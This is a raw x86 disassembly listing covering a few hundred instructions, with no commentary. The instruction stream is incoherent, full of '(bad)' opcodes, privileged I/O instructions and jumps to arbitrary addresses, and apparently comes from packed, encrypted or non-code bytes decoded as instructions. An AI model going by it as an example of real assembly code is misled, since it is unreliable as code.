  419aeb:	xchg   ebp,eax
  419aec:	jnp    0x419b2b
  419aee:	iret   
  419aef:	fcom   QWORD PTR [ecx+0x55cc3b1b]
  419af5:	add    DWORD PTR [edi],ecx
  419af7:	fsub   QWORD PTR [ebp-0x3f74dde4]
  419afd:	cmp    ebp,edi
  419aff:	jmp    0x419aa8
  419b01:	push   eax
  419b02:	jp     0x419af1
  419b04:	outs   dx,BYTE PTR ds:[esi]
  419b05:	sbb    al,0x6
  419b07:	mov    WORD PTR [ecx],gs
  419b09:	outs   dx,BYTE PTR ds:[esi]
  419b0a:	mov    ecx,0x616e7d34
  419b0f:	call   0xa490:0xc742a138
  419b16:	dec    edx
  419b17:	das    
  419b18:	push   eax
  419b1a:	push   edi
  419b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b1c:	ja     0x419ab8
  419b1e:	(bad)  
  419b1f:	sub    ch,bh
  419b21:	adc    al,BYTE PTR [edx-0x596a4491]
  419b27:	cmp    ch,0xa5
  419b2a:	jmp    0x2492be0f
  419b2f:	xchg   ecx,eax
  419b30:	ret    0x6d4b
  419b33:	xor    bl,BYTE PTR [ebp+edi*2-0x14]
  419b37:	pop    ecx
  419b38:	stos   BYTE PTR es:[edi],al
  419b39:	cmc    
  419b3a:	adc    al,0x41
  419b3c:	push   ss
  419b3d:	mov    ebx,0xbafb47b9
  419b42:	xor    eax,DWORD PTR [ebx+ebx*2]
  419b45:	add    eax,0x643692c7
  419b4a:	cmp    bh,BYTE PTR [ecx+0x60]
  419b4d:	lock and al,0x8e
  419b50:	aam    0x4d
  419b52:	(bad)  
  419b53:	jmp    0x419b8c
  419b55:	ret    0x86e4
  419b58:	retf   0xacbe
  419b5b:	or     DWORD PTR [eax-0x5a22317c],esi
  419b61:	adc    al,0x11
  419b63:	mov    ch,0x96
  419b65:	sbb    DWORD PTR [ecx+0x1d],ebx
  419b68:	retf   
  419b69:	mov    edx,0x4eece760
  419b6e:	inc    ebx
  419b6f:	cmp    dl,BYTE PTR [esi-0x2d]
  419b72:	shl    DWORD PTR [edi-0x34837052],1
  419b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b79:	fdiv   DWORD PTR [esi+0x62]
  419b7c:	add    bl,BYTE PTR [edi-0x272c3125]
  419b82:	stos   DWORD PTR es:[edi],eax
  419b83:	inc    edx
  419b84:	outs   dx,DWORD PTR ds:[esi]
  419b85:	pop    eax
  419b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b87:	cmp    esp,esp
  419b89:	fdiv   QWORD PTR [eax]
  419b8b:	mov    ds:0x9c525961,al
  419b90:	mov    eax,0xea9dda3f
  419b95:	dec    eax
  419b96:	loop   0x419bb8
  419b98:	pop    edx
  419b99:	jne    0x419bd2
  419b9b:	pop    ecx
  419b9c:	call   0x4d53:0xef57891
  419ba3:	cli    
  419ba4:	or     DWORD PTR [ebx+0x6b],0x7b6a7c6d
  419bab:	sbb    al,0x45
  419bad:	or     BYTE PTR [eax+0x7a],bl
  419bb0:	xor    eax,DWORD PTR [esi+0x53cb250c]
  419bb6:	sbb    DWORD PTR [eax+ebp*1+0x3ba624b4],edi
  419bbd:	fild   QWORD PTR [eax+0x9]
  419bc0:	lods   al,BYTE PTR ds:[esi]
  419bc1:	fwait
  419bc2:	push   edi
  419bc3:	popf   
  419bc4:	scas   al,BYTE PTR es:[edi]
  419bc5:	mov    ds:0x2f9a77b5,al
  419bca:	dec    esi
  419bcb:	aas    
  419bcc:	add    DWORD PTR [edi],ecx
  419bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bcf:	fdiv   QWORD PTR [edx+0x2061700e]
  419bd5:	ins    DWORD PTR es:[edi],dx
  419bd6:	ins    DWORD PTR es:[edi],dx
  419bd7:	fisttp DWORD PTR [edx]
  419bd9:	mov    ecx,0xb7f93ec
  419bde:	or     BYTE PTR [eax],ch
  419be0:	add    bh,BYTE PTR [edi+0x71]
  419be3:	mov    BYTE PTR ds:0x42864086,bh
  419be9:	mov    esi,DWORD PTR [edi]
  419beb:	xor    al,0x84
  419bed:	sbb    cl,ch
  419bef:	cmp    eax,0x935be75d
  419bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf5:	cld    
  419bf6:	push   edi
  419bf7:	dec    ebp
  419bf8:	sbb    esp,edx
  419bfa:	imul   ecx,DWORD PTR [eax*8+0x1e7c6914],0xa53a87ea
  419c05:	push   ecx
  419c06:	jecxz  0x419c0b
  419c08:	leave  
  419c09:	pushf  
  419c0a:	push   es
  419c0b:	retf   
  419c0c:	mov    ebp,0x562cac0
  419c11:	stos   BYTE PTR es:[edi],al
  419c12:	popf   
  419c13:	call   DWORD PTR [esi]
  419c15:	sbb    esp,DWORD PTR [ebp+0x34]
  419c18:	ds dec eax
  419c1a:	inc    eax
  419c1b:	test   eax,0xe72cf789
  419c20:	push   es
  419c21:	and    ebx,ebx
  419c23:	sub    ebx,DWORD PTR [esi+ebp*4]
  419c26:	into   
  419c27:	(bad)  
  419c28:	(bad)  
  419c29:	retf   
  419c2a:	aaa    
  419c2b:	mov    BYTE PTR [ebp+0x6ee40c7b],bl
  419c31:	and    DWORD PTR [edx],0x353587b1
  419c37:	scas   al,BYTE PTR es:[edi]
  419c38:	std    
  419c39:	or     ebp,DWORD PTR [ecx]
  419c3b:	sbb    DWORD PTR [ebx],ebx
  419c3d:	xchg   ecx,eax
  419c3e:	aaa    
  419c3f:	jne    0x419c10
  419c41:	push   ebp
  419c42:	aaa    
  419c43:	pop    eax
  419c44:	imul   ebx,DWORD PTR [edx+ecx*2-0x7377cda1],0xbe8060cf
  419c4f:	loop   0x419ccc
  419c51:	jo     0x419c87
  419c53:	test   DWORD PTR ds:0x5a6ee33c,ebx
  419c59:	cdq    
  419c5a:	mov    al,0x8d
  419c5c:	loop   0x419c72
  419c5e:	dec    edi
  419c5f:	mov    esp,esp
  419c61:	push   ss
  419c62:	cmp    al,0xa3
  419c64:	bts    DWORD PTR [ecx],0xf0
  419c68:	jecxz  0x419cc4
  419c6a:	and    eax,0x5e6b696e
  419c6f:	sahf   
  419c70:	loopne 0x419cb4
  419c72:	stc    
  419c73:	xchg   BYTE PTR [edi],ah
  419c75:	out    0x30,eax
  419c77:	(bad)  
  419c79:	sub    eax,DWORD PTR [edx]
  419c7b:	lods   eax,DWORD PTR ds:[esi]
  419c7c:	fistp  DWORD PTR [edi+0x46f50e3c]
  419c82:	les    ecx,FWORD PTR [ebx+0x6a]
  419c85:	mov    DWORD PTR [edi+0x2d28e688],ecx
  419c8b:	das    
  419c8c:	jl     0x419c91
  419c8e:	and    BYTE PTR [edx+edx*1],bl
  419c91:	in     eax,dx
  419c92:	xchg   bl,bl
  419c94:	scas   eax,DWORD PTR es:[edi]
  419c95:	dec    BYTE PTR [eax]
  419c97:	out    0x6a,al
  419c99:	scas   eax,DWORD PTR es:[edi]
  419c9a:	(bad)  
  419c9c:	nop
  419c9d:	int3   
  419c9e:	or     bh,BYTE PTR [edi-0x65]
  419ca1:	push   ebx
  419ca2:	push   edi
  419ca3:	pop    esi
  419ca4:	mov    al,0x95
  419ca6:	xchg   esi,eax
  419ca7:	and    dl,BYTE PTR [eax+0x29]
  419caa:	dec    eax
  419cab:	adc    al,0xeb
  419cad:	enter  0x862d,0x11
  419cb1:	pop    esi
  419cb2:	mov    eax,0x75f80709
  419cb7:	out    dx,eax
  419cb8:	ds xchg esp,ebp
  419cbb:	iret   
  419cbc:	into   
  419cbd:	leave  
  419cbe:	aad    0x2c
  419cc0:	pop    bp
  419cc2:	call   0x6505:0xdf39212c
  419cc9:	mov    esp,0x85962671
  419cce:	sub    edi,DWORD PTR [esp+eax*2]
  419cd1:	pop    esi
  419cd2:	pushf  
  419cd3:	dec    esp
  419cd4:	ja     0x419cca
  419cd6:	lods   al,BYTE PTR ds:[esi]
  419cd7:	jno    0x419cea
  419cd9:	js     0x419d50
  419cdb:	popa   
  419cdc:	add    al,BYTE PTR [edx]
  419cde:	xlat   BYTE PTR ds:[ebx]
  419cdf:	(bad)  
  419ce0:	sub    eax,0xe8fb31a0
  419ce5:	std    
  419ce6:	or     ecx,DWORD PTR [eax-0xbbe95b2]
  419cec:	cmp    ch,BYTE PTR ds:0xed6a9e40
  419cf2:	and    al,0x6d
  419cf4:	stos   DWORD PTR es:[edi],eax
  419cf5:	sub    eax,0x6004dce1
  419cfa:	pop    ss
  419cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cfc:	pop    es
  419cfd:	lock scas al,BYTE PTR es:[edi]
  419cff:	fnsetpm(287 only) 
  419d01:	into   
  419d02:	mov    al,ds:0x6e06391
  419d07:	(bad)  
  419d08:	pusha  
  419d09:	fstp   DWORD PTR [ebx]
  419d0b:	popa   
  419d0c:	add    ch,BYTE PTR [edx+edx*2]
  419d0f:	les    ebx,FWORD PTR [ecx-0x20]
  419d12:	idiv   BYTE PTR [eax+ecx*4]
  419d15:	loopne 0x419d8c
  419d17:	test   al,0xc8
  419d19:	stos   DWORD PTR es:[edi],eax
  419d1a:	jbe    0x419d8b
  419d1c:	fcomp  DWORD PTR [esi]
  419d1e:	ss nop
  419d20:	(bad)  
  419d21:	std    
  419d22:	mov    dl,0x99
  419d24:	push   eax
  419d25:	(bad)  
  419d26:	mov    ch,0x7e
  419d28:	pop    eax
  419d29:	pop    edx
  419d2a:	jmp    0xc9f0:0x3cd2b3e5
  419d31:	bound  ecx,QWORD PTR [esi]
  419d33:	mov    dl,0xe7
  419d35:	lods   al,BYTE PTR ds:[esi]
  419d36:	iret   
  419d37:	stc    
  419d38:	retf   
  419d39:	in     eax,0x9
  419d3b:	mov    ecx,DWORD PTR [ecx]
  419d3d:	rcl    BYTE PTR [edi+0x4fce383],cl
  419d43:	lea    eax,[edi]
  419d45:	or     al,0x2f
  419d47:	push   eax
  419d48:	push   ebp
  419d49:	fimul  WORD PTR [eax+esi*8+0x5a]
  419d4d:	arpl   WORD PTR [edi+0x5c],dx
  419d50:	lock fsub DWORD PTR [edx+0x68e13dd9]
  419d57:	jmp    0xdd6b0ee8
  419d5c:	pop    ss
  419d5d:	and    al,BYTE PTR [ecx+0x1ddd5942]
  419d63:	inc    eax
  419d64:	push   ebx
  419d65:	adc    ebx,DWORD PTR [edi+0x4c4a899f]
  419d6b:	and    al,0x2a
  419d6d:	arpl   WORD PTR [ebx+0x5455d2e6],dx
  419d73:	adc    bh,0x82
  419d76:	push   ecx
  419d77:	xor    edi,ebx
  419d79:	fdiv   QWORD PTR [edx]
  419d7b:	jno    0x419d1b
  419d7d:	out    0xa0,eax
  419d7f:	scas   al,BYTE PTR es:[edi]
  419d80:	xor    ecx,ebp
  419d82:	(bad)  
  419d83:	imul   esp,DWORD PTR [ebx],0x4a22caee
  419d89:	adc    al,0xed
  419d8b:	out    0x94,al
  419d8d:	pop    ecx
  419d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8f:	jle    0x419dad
  419d91:	xor    eax,esp
  419d93:	shr    BYTE PTR [esi+0x6103b6a7],cl
  419d99:	xchg   edx,eax
  419d9a:	pushf  
  419d9b:	shr    DWORD PTR [eax+0x51],1
  419d9e:	inc    edi
  419d9f:	psubsb mm7,mm3
  419da2:	add    ebp,0x50
  419da5:	cmp    eax,0x8bbf4437
  419daa:	bound  ebx,QWORD PTR [ebx+0x57]
  419dad:	fdivp  st(2),st
  419daf:	pop    edx
  419db0:	xor    BYTE PTR [ebp-0x1b],bh
  419db3:	xchg   edx,eax
  419db4:	and    al,0x54
  419db6:	xor    DWORD PTR [ebx],esi
  419db8:	mov    WORD PTR [edx-0x3448519],gs
  419dbe:	sbb    edi,DWORD PTR [edx+ebx*4+0x2a]
  419dc2:	inc    ebp
  419dc3:	(bad)
  419dc6:	push   ebp
  419dc7:	mov    edx,0xa7574433
  419dcc:	cli    
  419dcd:	dec    edx
  419dce:	xor    DWORD PTR [esi+0x5d],ebp
  419dd1:	pop    ebx
  419dd2:	xor    eax,0xa46f7787
  419dd7:	mov    BYTE PTR [ecx+ebp*8+0x10a0d89d],cl
  419dde:	push   esp
  419ddf:	jp     0x419dcb
  419de1:	ins    BYTE PTR es:[edi],dx
  419de2:	cmp    cl,BYTE PTR [eax+eax*2]
  419de5:	stos   DWORD PTR es:[edi],eax
  419de6:	sub    BYTE PTR [ebx+0x57],0xd8
  419dea:	js     0x419e3b
  419dec:	ds pop edi
  419dee:	add    eax,DWORD PTR [edi+0x306dfa76]
  419df4:	ss daa 
  419df6:	ret    
  419df7:	icebp  
  419df8:	je     0x419e44
  419dfa:	mov    cl,0x21
  419dfc:	mov    ss:0xe1ad656d,al
  419e02:	add    eax,0x839dc66a
  419e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e08:	or     DWORD PTR [edx],0xab300b8d
  419e0e:	int    0xbb
  419e10:	cmp    BYTE PTR [edi-0x13],cl
  419e13:	xchg   ecx,eax
  419e14:	adc    eax,0xa70f1c0b
  419e19:	test   dh,cl
  419e1b:	mov    esi,0xe0f65191
  419e20:	fsubr  st,st(6)
  419e22:	adc    eax,0x66e66a91
  419e27:	push   ebp
  419e28:	pusha  
  419e29:	ins    BYTE PTR es:[edi],dx
  419e2a:	pop    ecx
  419e2b:	sbb    DWORD PTR [ebx+ebp*2+0x5],eax
  419e2f:	mov    ecx,0x65c8e1f0
  419e34:	aad    0xb0
  419e36:	out    dx,eax
  419e37:	loope  0x419e9c
  419e39:	fild   DWORD PTR [esi+0x7e]
  419e3c:	pop    ebx
  419e3d:	dec    ecx
  419e3e:	mov    edx,0xc04bf8db
  419e43:	mov    esp,gs
  419e45:	jg     0x419e06
  419e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e48:	mov    ch,0x19
  419e4a:	jae    0x419e04
  419e4c:	or     edx,ebx
  419e4e:	add    DWORD PTR [edx-0x64f54bc7],esi
  419e54:	imul   DWORD PTR [eax]
  419e56:	or     al,0x24
  419e58:	push   0x51
  419e5a:	iret   
  419e5b:	add    DWORD PTR [ecx],esp
  419e5d:	arpl   ax,ax
  419e5f:	pop    eax
  419e60:	hlt    
  419e61:	and    DWORD PTR [ebx],eax
  419e63:	ret    0xc2b8
  419e66:	fwait
  419e67:	mov    esp,0xa9413499
  419e6c:	mov    dl,0x18
  419e6e:	jl     0x419e99
  419e70:	out    dx,eax
  419e71:	test   eax,0x8cfac60d
  419e76:	and    DWORD PTR [esi-0x7b],ecx
  419e79:	sbb    eax,0xee2cb711
  419e7e:	cmp    al,0x9c
  419e80:	push   cs
  419e81:	xor    BYTE PTR [ebp-0x52],0x25
  419e85:	xchg   edi,eax
  419e86:	push   ss
  419e87:	inc    ebp
  419e88:	cmp    esi,ebx
  419e8a:	jno    0x419eb3
  419e8c:	repnz xchg ah,ch
  419e8f:	test   eax,0xfd4510a1
  419e94:	dec    ecx
  419e95:	and    eax,0x5df41b08
  419e9a:	out    0x5e,eax
  419e9c:	mov    WORD PTR [ebx-0x5e],es
  419e9f:	cld    
  419ea0:	add    eax,0x74b8a495
  419ea5:	stc    
  419ea6:	inc    eax
  419ea7:	add    al,0x5c
  419ea9:	cmp    eax,0x497a983f
  419eae:	jge    0x419f04
  419eb0:	add    al,0xa7
  419eb2:	xchg   DWORD PTR [edx-0x6d1e2470],edx
  419eb8:	fisttp DWORD PTR [ebp-0x697f9481]
  419ebe:	jmp    0x419e52
  419ec0:	das    
  419ec1:	mov    esp,0x1b82931
  419ec6:	mov    al,0x45
  419ec8:	xor    cl,BYTE PTR [edi+0xc7f2007]
  419ece:	imul   ebp,eax,0x6647b0f0
  419ed4:	sub    ch,BYTE PTR [ebx-0x25653610]
  419eda:	stos   DWORD PTR es:[edi],eax
  419edb:	mov    cl,ah
  419edd:	add    edi,DWORD PTR [edi-0x11]
  419ee0:	lods   al,BYTE PTR ds:[esi]
  419ee1:	jge    0x419ed7
  419ee3:	pop    eax
  419ee4:	fidivr WORD PTR [ecx]
  419ee6:	(bad)  
  419ee7:	out    0x8b,al
  419ee9:	xor    bh,al
  419eeb:	sbb    bh,al
  419eed:	retf   
  419eee:	call   0x44938898
  419ef3:	vmread DWORD PTR [edx],eax
  419ef6:	(bad)  
  419ef7:	mov    eax,ds:0x198121d7
  419efc:	cdq    
  419efd:	push   0xffffffaa
  419eff:	imul   esi,DWORD PTR [ebx-0x49],0xffffffae
  419f03:	sub    DWORD PTR [eax-0x78],ebp
  419f06:	jg     0x419f54
  419f08:	adc    ebp,DWORD PTR [edx+0x51e7922b]
  419f0e:	push   eax
  419f0f:	nop
  419f10:	fs mov dh,0xdc
  419f13:	rcl    ebx,0x7d
  419f16:	clc    
  419f17:	mov    ds:0xbfe14895,al
  419f1c:	mov    eax,ds:0xef095bf4
  419f21:	mov    ah,0x63
  419f23:	popf   
  419f24:	mov    esi,DWORD PTR [eax]
  419f26:	data16 das 
  419f28:	(bad)  
  419f29:	dec    eax
  419f2a:	or     eax,0xd1a59a5d
  419f2f:	scas   eax,DWORD PTR es:[edi]
  419f30:	bound  esi,QWORD PTR [edi]
  419f32:	adc    BYTE PTR [edi+0x710db85f],dl
  419f38:	test   eax,0x8f22f2e3
  419f3d:	sub    cl,BYTE PTR [ecx]
  419f3f:	jle    0x419f5d
  419f41:	sub    eax,0xd4db9c7c
  419f46:	out    dx,eax
  419f47:	stc    
  419f48:	xchg   esp,eax
  419f49:	pop    edi
  419f4a:	ret    0xf045
  419f4d:	mov    eax,0x254c5341
  419f52:	jge    0x419fa8
  419f54:	aas    
  419f55:	add    DWORD PTR [ebp+0x11],0xffffffe8
  419f59:	retf   
  419f5a:	mov    ah,0x3d
  419f5c:	mov    bh,0x47
  419f5e:	stc    
  419f5f:	retf   
  419f60:	cmp    eax,0xe4b3eb67
  419f65:	das    
  419f66:	ret    
  419f67:	cmp    BYTE PTR [edi+0x572b2485],ah
  419f6d:	imul   BYTE PTR [esi+0x20]
  419f70:	pop    es
  419f71:	mov    al,0x87
  419f73:	dec    esi
  419f74:	mov    bh,0xda
  419f76:	das    
  419f77:	in     eax,dx
  419f78:	inc    ebp
  419f79:	cmp    al,0xab
  419f7b:	cs clc 
  419f7d:	nop
  419f7e:	jp     0x419f5d
  419f80:	and    eax,0x3ed9db2c
  419f85:	pop    edx
  419f86:	rcr    BYTE PTR [edi-0x7c],1
  419f89:	sbb    esi,DWORD PTR [edi+eiz*2]
  419f8c:	(bad)  
  419f8e:	and    al,0xed
  419f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f91:	inc    edx
  419f92:	pusha  
  419f93:	ins    DWORD PTR es:[edi],dx
  419f94:	push   edi
  419f95:	mov    ch,0xb4
  419f97:	or     al,0xfb
  419f99:	sub    dh,dl
  419f9b:	sar    DWORD PTR [ecx-0x7d8a50ee],0xc1
  419fa2:	inc    ecx
  419fa3:	pop    ebp
  419fa4:	sbb    eax,0x3a3d88d4
  419fa9:	or     BYTE PTR [eax-0x7f1fcbeb],0xf
  419fb0:	out    dx,eax
  419fb1:	adc    esp,DWORD PTR [esi]
  419fb3:	cld    
  419fb4:	cmp    BYTE PTR [ebx],bh
  419fb6:	ror    DWORD PTR [edx+0x4b0afff6],0xd0
  419fbd:	enter  0xfa7e,0x76
  419fc1:	ins    BYTE PTR es:[edi],dx
  419fc2:	and    ecx,edx
  419fc4:	out    0xb8,al
  419fc6:	mov    DWORD PTR ds:0x74abe2ef,0x38485a10
  419fd0:	cld    
  419fd1:	or     DWORD PTR [esi+0x75],edx
  419fd4:	jecxz  0x419f57
  419fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd7:	call   0x4a1f210a
  419fdc:	add    BYTE PTR [eax+ebx*8],dh
  419fdf:	(bad)  
  419fe0:	mov    esp,0xda6de02a
  419fe5:	scas   al,BYTE PTR es:[edi]
  419fe6:	cdq    
  419fe7:	lods   al,BYTE PTR ds:[esi]
  419fe8:	fstp   DWORD PTR [ecx-0x1fa593b2]
  419fee:	sbb    BYTE PTR [edx],dh
  419ff0:	push   ds
  419ff1:	jmp    0x59cba486
  419ff6:	jmp    0x41a005
  419ff8:	mov    esi,0x9cbb8e2e
  419ffd:	icebp  
  419ffe:	fld    st(4)
  41a000:	test   BYTE PTR [edx],dh
  41a002:	rcl    esi,0x9b
  41a005:	mov    esi,0x130659d7
  41a00a:	into   
  41a00b:	cwde   
  41a00c:	outs   dx,DWORD PTR ds:[esi]
  41a00d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a00e:	int3   
  41a00f:	mov    eax,0xf56d2fea
  41a014:	and    eax,0x30696aab
  41a019:	fbstp  TBYTE PTR [ebp-0x28a01609]
  41a01f:	pop    ecx
  41a020:	int3   
  41a021:	xchg   esi,eax
  41a022:	or     eax,0x788715af
  41a027:	adc    esi,ebx
  41a029:	mov    edi,0x442ac8aa
  41a02e:	inc    ebx
  41a02f:	pushf  
  41a030:	shl    edx,0xf
  41a033:	inc    ecx
  41a034:	arpl   WORD PTR [esi+0x26],di
  41a037:	icebp  
  41a038:	outs   dx,BYTE PTR ds:[esi]
  41a039:	push   es
  41a03a:	adc    al,0xef
  41a03c:	ins    BYTE PTR es:[edi],dx
  41a03d:	stos   DWORD PTR es:[edi],eax
  41a03e:	pop    edi
  41a03f:	repz ror BYTE PTR [ebx+0x52db128a],1
  41a046:	and    DWORD PTR [esi-0x56b2dd8a],esp
  41a04c:	dec    ecx
  41a04d:	xchg   edx,eax
  41a04e:	or     DWORD PTR [ecx],ebx
  41a050:	sti    
  41a051:	sub    al,0xd1
  41a053:	or     al,0xa
  41a055:	mov    esp,0xa41e86a9
  41a05a:	add    BYTE PTR [edx-0x6d07fc78],ch
  41a060:	aaa    
  41a061:	sub    eax,0x55b72f5b
  41a066:	(bad)  [edx+0x2118066e]
  41a06c:	or     BYTE PTR [ecx+0x34],bh
  41a06f:	int    0x4c
  41a071:	test   BYTE PTR [edx-0x42],cl
  41a074:	push   es
  41a075:	cs out 0xb1,eax
  41a078:	sbb    BYTE PTR [edi-0x1f],ch
  41a07b:	mov    al,BYTE PTR [edi+0x41]
  41a07e:	bound  ebp,QWORD PTR [ebx-0x5f73a972]
  41a084:	mov    al,ds:0x93c00ae8
  41a089:	push   0x9f32b9fc
  41a08e:	mov    eax,ds:0xe70a294d
  41a093:	arpl   sp,ax
  41a095:	mov    eax,ds:0xf8a1e8ef
  41a09a:	stos   DWORD PTR es:[edi],eax
  41a09b:	into   
  41a09c:	js     0x41a0ea
  41a09e:	std    
  41a09f:	(bad)  
  41a0a0:	outs   dx,DWORD PTR ds:[esi]
  41a0a1:	jl     0x41a0d9
  41a0a3:	out    dx,al
  41a0a4:	push   edx
  41a0a5:	inc    esi
  41a0a6:	(bad)  
  41a0a7:	lock stos BYTE PTR es:[edi],al
  41a0a9:	loopne 0x41a058
  41a0ab:	inc    ebx
  41a0ac:	or     eax,0x9b84dae6
  41a0b1:	xor    DWORD PTR [ecx],esp
  41a0b3:	mov    ss,WORD PTR [ecx]
  41a0b5:	mov    edi,esp
  41a0b7:	sbb    edx,DWORD PTR [edi+0x54c860a2]
  41a0bd:	dec    esi
  41a0be:	mov    ebp,0x242132a8
  41a0c3:	sbb    cl,dl
  41a0c5:	sub    ebp,DWORD PTR [esi+0x6794179c]
  41a0cb:	fidivr WORD PTR [ebx-0x10220dd3]
  41a0d1:	outs   dx,BYTE PTR ds:[esi]
  41a0d2:	je     0x41a0ee
  41a0d4:	aas    
  41a0d5:	cmp    bl,BYTE PTR [edi-0x224d88c]
  41a0db:	inc    ebx
  41a0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0dd:	xchg   esp,eax
  41a0de:	mov    ah,0x67
  41a0e0:	jmp    0x41a092
  41a0e2:	mov    WORD PTR [ecx-0x6c],gs
  41a0e5:	sar    ebx,0xc
  41a0e8:	adc    ch,al
  41a0ea:	sub    esi,ebx
  41a0ec:	popf   
  41a0ed:	pop    DWORD PTR [eax+0x6548c710]
  41a0f3:	sub    al,0x2e
  41a0f5:	dec    ebx
  41a0f6:	sbb    ebp,DWORD PTR [edx+esi*8-0x5]
  41a0fa:	mov    ds:0x233184e8,al
  41a0ff:	out    0x93,al
  41a101:	dec    eax
  41a102:	sub    BYTE PTR [ecx],0xb5
  41a105:	(bad)  [edi+0x1b]
  41a108:	or     eax,0x3c2cf1b6
  41a10d:	jnp    0x41a0f5
  41a10f:	inc    ebp
  41a110:	mov    ebx,0x9cb0be3d
  41a115:	sbb    BYTE PTR [ebx-0x25],ch
  41a118:	and    esp,eax
  41a11a:	test   ebx,0xc5160a7f
  41a120:	shl    DWORD PTR [ecx+0x3],0x9e
  41a124:	cmp    esp,ecx
  41a126:	cmc    
  41a127:	pop    edx
  41a128:	cmp    BYTE PTR [edi],0xca
  41a12b:	sub    BYTE PTR [edx],bh
  41a12d:	idiv   DWORD PTR [edi+0x33ad97a9]
  41a133:	in     eax,0x85
  41a135:	jmp    0x322ae1f4
  41a13a:	fwait
  41a13b:	stos   DWORD PTR es:[edi],eax
  41a13c:	(bad)  
  41a13d:	and    al,0x75
  41a13f:	push   cs
  41a140:	jo     0x41a142
  41a142:	sub    DWORD PTR [ebx+0x71d53c23],0x14
  41a149:	push   ebp
  41a14a:	mov    cs,WORD PTR [edi+0x46]
  41a14d:	hlt    
  41a14e:	aaa    
  41a14f:	dec    ebx
  41a150:	sub    al,0x96
  41a152:	push   cs
  41a153:	test   BYTE PTR [ebx],0xf1
  41a156:	ja     0x41a166
  41a158:	jbe    0x41a16f
  41a15a:	loop   0x41a1d0
  41a15c:	and    esp,edx
  41a15e:	push   esp
  41a15f:	test   al,0x5d
  41a161:	stos   DWORD PTR es:[edi],eax
  41a162:	cmp    ebp,DWORD PTR [esi-0x75]
  41a165:	(bad)  
  41a166:	sbb    esp,DWORD PTR [ebx-0xb]
  41a169:	fild   QWORD PTR [edx+0xe]
  41a16c:	lock xor eax,0x2d8dfc97
  41a172:	scas   eax,DWORD PTR es:[edi]
  41a173:	mov    ds:0x78ea491c,al
  41a178:	add    DWORD PTR [edi-0x77],ebp
  41a17b:	mov    esp,0xbd21b5ec
  41a180:	out    0xc5,eax
  41a182:	inc    eax
  41a183:	add    al,cl
  41a185:	fld    QWORD PTR [eax-0x71c90592]
  41a18b:	fwait
  41a18c:	nop
  41a18d:	xchg   ecx,eax
  41a18e:	ja     0x41a126
  41a190:	add    DWORD PTR [ecx],eax
  41a192:	mov    al,0x8c
  41a194:	call   0x14fa:0x2ffb2147
  41a19b:	mov    edx,0x57dd6aee
  41a1a0:	or     bh,BYTE PTR [eax+0x2842e02a]
  41a1a6:	test   eax,0xbf19ff17
  41a1ab:	pop    es
  41a1ac:	icebp  
  41a1ad:	loop   0x41a1ab
  41a1af:	sbb    al,0x43
  41a1b1:	and    BYTE PTR [edx],al
  41a1b3:	sar    DWORD PTR [edi],0x7
  41a1b6:	data16 cmp ah,BYTE PTR [ebp-0x4e8b4cb7]
  41a1bd:	sub    bh,dh
  41a1bf:	popf   
  41a1c0:	or     al,0x7
  41a1c2:	xchg   ecx,eax
  41a1c3:	imul   edi,DWORD PTR [esi],0xffffffc0
  41a1c6:	enter  0x8118,0xde
  41a1ca:	pop    es
  41a1cb:	mov    ecx,0x4aad0371
  41a1d0:	mov    DWORD PTR [ecx+0x6a],ecx
  41a1d3:	(bad)  
  41a1d4:	std    
  41a1d5:	jecxz  0x41a1ff
  41a1d7:	out    0xf4,al
  41a1d9:	(bad)  
  41a1da:	cdq    
  41a1db:	(bad)  
  41a1dd:	add    DWORD PTR [edi],eax
  41a1df:	hlt    
  41a1e0:	xchg   esp,eax
  41a1e1:	push   ebp
  41a1e2:	mov    ah,0x18
  41a1e4:	mov    ch,0xb5
  41a1e6:	call   0x92f3:0xc590aee4
  41a1ed:	xchg   esi,eax
  41a1ee:	out    dx,eax
  41a1ef:	push   ecx
  41a1f0:	pop    esi
  41a1f1:	sbb    ebx,DWORD PTR [eax+0x77f7fd44]
  41a1f7:	ret    0xcbaf
  41a1fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1fb:	jnp    0x41a1df
  41a1fd:	mov    esi,0x7c15980
  41a202:	addr16 mov al,ds:0x20a
  41a206:	dec    esp
  41a207:	push   edx
  41a208:	sar    DWORD PTR [edx+0x745f81c8],cl
  41a20e:	pusha  
  41a20f:	shl    bl,0x19
  41a212:	mov    dl,0x9d
  41a214:	aam    0x43
  41a216:	mov    edi,0x55c1600c
  41a21b:	fmul   st,st(3)
  41a21d:	and    esp,DWORD PTR [edx+0x62]
  41a220:	test   ebp,edx
  41a222:	inc    ebx
  41a223:	mov    ecx,0x2d96107f
  41a228:	mov    edx,0xba31f0e7
  41a22d:	fbstp  TBYTE PTR ds:0x7dee5c99
  41a233:	mov    eax,ds:0x2a97e137
  41a238:	lock inc esi
  41a23a:	fwait
  41a23b:	nop
  41a23c:	dec    ebx
  41a23d:	aas    
  41a23e:	sub    DWORD PTR [ecx-0x2e250d7e],ebp
  41a244:	dec    ebp
  41a245:	jb     0x41a201
  41a247:	retf   0xd3cf
  41a24a:	inc    esp
  41a24b:	(bad)  
  41a24d:	jb     0x41a1d3
  41a24f:	gs add cl,bl
  41a252:	imul   ebx,DWORD PTR [edi+0x123f1f3],0xffffffe0
  41a259:	mov    bh,0x69
  41a25b:	nop
  41a25c:	xchg   esi,ebp
  41a25e:	aas    
  41a25f:	jb     0x41a2c4
  41a261:	xor    al,0xb8
  41a263:	ins    DWORD PTR es:[edi],dx
  41a264:	std    
  41a265:	cmp    BYTE PTR [esi+0x74],dh
  41a268:	jle    0x41a1fd
  41a26a:	iret   
